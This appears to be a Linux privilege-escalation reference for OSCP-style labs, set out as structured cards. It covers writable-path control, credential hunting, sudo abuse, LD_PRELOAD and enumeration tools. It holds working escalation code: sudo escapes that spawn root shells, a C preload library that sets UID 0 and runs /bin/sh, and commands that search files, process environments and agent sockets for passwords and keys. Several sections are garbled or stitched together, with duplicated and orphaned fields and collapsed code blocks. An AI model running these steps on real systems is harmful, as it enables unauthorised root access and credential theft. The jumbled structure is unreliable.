title: Prove effective file, directory, ACL and mount control
clue: A root-consumed file or directory appears writable
conditions: Effective access through every parent/ACL and mount; a privileged consumer and trigger are identified separately
access: A verified Linux foothold with a known effective UID, groups and filesystem context
result: A validated controlled object suitable for a specific execution or credential chain
mechanics: Directory write plus traversal can allow replacement without direct file write. ACLs, sticky directories, immutable attributes and mount options can change the effective operation.
example: Observation: a service script is read-only but its parent is writable. Test: inspect replacement rights and the service's actual path. Illustrative output: the caller can replace the exact consumed object. Interpretation: the control primitive exists; now verify privileged identity and trigger.
verify: Prove the specific read/write/replace action and consumer path; world-writable alone is not the complete escalation chain.
failure: A read-only/noexec/nosuid mount changes which effects are possible. Find another consumer rather than assuming every permission bypasses mount policy.

recognition.where: From a real privileged script/binary/configuration path inspect every parent, ACL and effective mount before assuming control.
recognition.sample:
file: root-owned, not directly writable
parent: current group has write+execute
mount: rw
recognition.spot: Parent replacement can provide a control primitive even when the existing file's write bit is absent.
recognition.confirm: Check effective membership, delete/replace restrictions, the exact privileged consumer and a usable trigger.
recognition.enabled: The precise object can be replaced and is consumed under a higher identity: choose that control path.
recognition.ruledout: Parent/file rights do not grant the needed operation: reject that proposed write.
recognition.unknown: An ACL listing without effective trustee/mount context leaves control unresolved.

procedure:
```bash
namei -l /PATH/TO/OBJECT
stat /PATH/TO/OBJECT /PATH/TO/PARENT
getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null
findmnt -T /PATH/TO/OBJECT -o TARGET,SOURCE,FSTYPE,OPTIONS
```

> Directory write+execute can permit replacement even when the file is not writable. ACLs can add/remove effective access. `nosuid` defeats SUID/SGID and file-capability effects; `noexec` blocks direct execution; `ro` blocks changes.

Discover writable objects, then prioritize root-owned configuration, scripts, binaries and parents under `/etc`, `/opt`, `/usr/local`, application paths and service working directories:

```bash
find / -xdev -type f -writable -ls 2>/dev/null
find / -xdev -type d -writable -ls 2>/dev/null
```

title: Recover credentials from Linux user, service and process trails
clue: Readable configuration, shell history, environment, process arguments or session sockets
conditions: Read access to the artifact; exact account/service context; session/agent access must include a usable live identity
access: A verified Linux foothold with a known effective UID, groups and filesystem context
result: Typed credentials or an explicitly authorized usable session capability
mechanics: Secrets can outlive the operation that created them. Process visibility and readable environment depend on permissions; finding a socket does not prove the right to use the associated session.
checks:
```bash
history
ps auxww
env
find /opt /var/www /srv -maxdepth 3 -type f -readable 2>/dev/null
```
example: Observation: a service command line contains a database password. Test: identify its service/account scope and validate the source login. Illustrative output: database access works but the same OS username does not. Interpretation: enumerate database rights instead of assuming universal reuse.
verify: Record source, exact material type and validated identity/service; keep real secrets in private lab records.
failure: Stale examples and unrelated tokens are common. A denied process read is a visibility limit, not evidence that no credentials exist elsewhere.

recognition.where: Follow observed application processes and directories into readable configuration, history and environment; prioritize paths tied to actual services.
recognition.sample:
Process: APP_SERVICE --config /opt/APP/config.ini
Readable file: /opt/APP/config.ini
Setting: database_user=DB_USER; password=PASSWORD
recognition.spot: An actual service's readable configuration supplies an identity-labelled secret candidate.
recognition.confirm: Classify the value, determine application/local/domain scope and test a compatible relevant operation.
recognition.enabled: The secret works in its verified identity/service context: use that access and re-enumerate.
recognition.ruledout: The value is a stale example and no longer accepted: reject that credential pairing.
recognition.unknown: A token-like string without service/account context requires provenance work before reuse.

procedure:
```bash
history 2>/dev/null
find /home /root -maxdepth 3 -type f \
  \( -name '.*history' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \
     -o -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*.bak' \) \
  -readable 2>/dev/null

grep -RniE 'pass(word)?|secret|token|api[_-]?key|connection(string)?' \
  /var/www /opt /srv /etc 2>/dev/null | head -n 200
```

Inspect process arguments and readable process environment:

```bash
ps auxww
ps eww -u root 2>/dev/null
tr '\0' ' ' < /proc/PID/cmdline 2>/dev/null; echo
tr '\0' '\n' < /proc/PID/environ 2>/dev/null
```

Check reusable local sessions/agents only when their sockets are accessible:

```bash
w; who; last -n 20
env | grep -E 'SSH_AUTH_SOCK|TMUX|STY'
tmux ls 2>/dev/null
screen -ls 2>/dev/null
find /tmp /run -maxdepth 3 -type s -ls 2>/dev/null
```

> An agent, tmux/screen or daemon socket needs effective socket access and a useful authenticated/privileged session. Presence alone is not session hijacking.

> **Next:** identify the value's user/service context, validate the smallest relevant transition (`su`, `sudo`, SSH or application authentication), then re-enumerate. Use [credential handling](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/04-shells-transfers-credentials/03-credential-use-and-cracking.md) for cracking/reuse.

```bash
find /home /var/www /opt /srv -type f \
  \( -iname '*.conf' -o -iname '*.ini' -o -iname '*.env' -o -iname '*.bak' \
     -o -iname '*.old' -o -iname '*.key' -o -iname '*.pem' \) 2>/dev/null

rg -ni 'password|passwd|token|secret|api[_-]?key|connection(string)?' \
  /var/www /opt /srv 2>/dev/null
```

title: Use an allowed sudo operation to cross a privilege boundary
clue: sudo -l grants an operation under a more useful identity
conditions: Exact executable/run-as/argument rule permits a useful primitive; password tags, environment and policy do not invalidate it
access: A verified Linux foothold with a known effective UID, groups and filesystem context
result: A verified privileged command, file operation or identity transition
mechanics: Sudo grants a configured operation, not arbitrary root by default. Interpreter escapes, editors, file writers and helpers are different useful primitives whose exact invocation must fit the rule.
example: Observation: the rule permits a specific interpreter as root without restricted arguments. Test: compare its documented privileged mode with the full rule and execute a minimal identity proof. Illustrative output: effective UID 0. Interpretation: verify host context and re-enumerate privileged files.
verify: Verify the executed run-as identity and effective UID; preserve the matching rule and successful operation.
failure: Restricted arguments, another run-as user, privilege dropping, NOEXEC or MAC policy can block the candidate. Evaluate another permitted primitive.

recognition.where: Run the exact sudo policy query from the current user and read run-as identity, executable, arguments and tags.
recognition.spot: The rule permits that exact program as root; its documented privileged operation becomes a candidate.
recognition.confirm: Check argument restrictions, password requirement, environment, privilege dropping, NOEXEC and MAC policy.
recognition.enabled: The allowed invocation exposes a useful operation and its effect is verified: choose that sudo method.
recognition.ruledout: Only a fixed harmless argument pattern is permitted: reject the unrestricted escape assumption.
recognition.unknown: A password-required response does not show the rule; obtain the legitimate credential/context before deciding.

procedure:
```bash sudo -n -l 2>&1 sudo -l sudo --version ``` Record the run-as identity, password tag, executable path, argument constraints/wildcards and `SETENV`/`NOSETENV`/`env_keep`/`secure_path`/`NOEXEC`. Match the exact mode under [GTFOBins](https://gtfobins.github.io/). ```bash sudo /usr/bin/find . -exec /bin/sh \; -quit sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}' sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")' ``` > Use an example only when the entire rule permits it. Restricted arguments, another path/build, privilege dropping, `NOEXEC`, a non-root run-as user or MAC policy can invalidate the escape.
Preserved LD_PRELOAD variant > Requires an explicitly allowed/preserved variable and a dynamically linked allowed program. ```bash sudo -l | grep -E 'SETENV|env_keep.*LD_PRELOAD' ``` ```c #include #include void _init(void) { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/sh"); } ``` ```bash gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c sudo LD_PRELOAD=/tmp/preload.so /ALLOWED/PROGRAM ``` > Static linking, secure-loader behavior, missing environment permission or MAC denial disproves this route.

title: Load a controlled library through a permitted sudo environment
clue: A sudo rule explicitly preserves or permits a loader variable
conditions: Allowed variable setting/preservation, a dynamically linked permitted executable and a loader path that honors it
access: A verified Linux foothold with a known effective UID, groups and filesystem context
result: Verified privileged library initialization under the permitted run-as identity
mechanics: LD_PRELOAD inserts a library before normal symbol resolution only when the privileged execution path preserves and honors it. Merely setting the variable in an ordinary shell does not satisfy sudo or secure-loader policy.
example: Observation: the rule permits a loader variable for one dynamic program. Test: inspect the exact rule and executable before using the controlled library. Illustrative output: the library's identity proof runs as the run-as user. Interpretation: the loader transition is verified.
verify: Require the library's actual effect and effective identity; a successful compile alone proves nothing about the loader.
failure: Static linking, environment sanitization, secure-execution handling and policy denial break this route.

recognition.where: Inspect sudo's environment-related tags/defaults and the exact allowed executable's dynamic-linking evidence.
recognition.sample:
env_keep includes LD_PRELOAD, or applicable SETENV
Allowed program: dynamically linked
Run-as: root
recognition.spot: Explicit environment permission plus a compatible dynamic consumer suggests a loader-injection candidate.
recognition.confirm: Verify the exact rule permits the variable and that the actual privileged loader honors it.
recognition.enabled: The permitted loader consumes the chosen library and its effect runs under the expected identity: select this route.

Illustrative output: library initialization runs under the higher identity. Interpretation: the library-consumption chain is verified.
verify: Prove the selected library path and effective execution identity; retain dependency and trigger evidence.

procedure:

```bash
file /PATH/TO/BINARY
readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED'
ldd /PATH/TO/BINARY 2>/dev/null
```

> Need a privileged dynamically linked consumer plus a missing/selected library resolved from a writable location or a preserved loader variable. Secure-execution mode strips many loader variables from SUID/SGID programs. Prefer `readelf` over executing an untrusted file through an unsafe `ldd` implementation.

For root-run scripts, inspect imports/includes and their actual search order. A writable current directory, module path or imported file can be a privileged input even when the main script is protected:

```bash
grep -nE '^(import|from) |require\(|include|source |\. ' /PATH/TO/SCRIPT
/PATH/TO/python3 -c 'import sys; print("\n".join(sys.path))'
```

> Prove the privileged interpreter uses the writable module/include before changing it. The interactive interpreter's search path may differ from cron/systemd/sudo.

recognition.ruledout: Only a low-privileged process consumes the object: reject the escalation hypothesis.
recognition.unknown: Missing tools or restricted /proc can hide evidence; investigate application-specific paths manually.

procedure:
```bash
./linpeas.sh | tee linpeas.txt
./lse.sh | tee lse.txt
./lse.sh -l1 | tee lse-l1.txt
./unix-privesc-check standard > unix-privesc-check.txt
```

> LinPEAS `-a` adds longer/noisier checks, including process monitoring and password attempts; it is not the baseline. LSE progresses from default to `-l1`, then `-l2` only if needed. `unix-privesc-check detailed` is slower and more false-positive-prone.

```text
exact object | effective permission | privileged consumer | identity | trigger | expected effect | manual verification
```
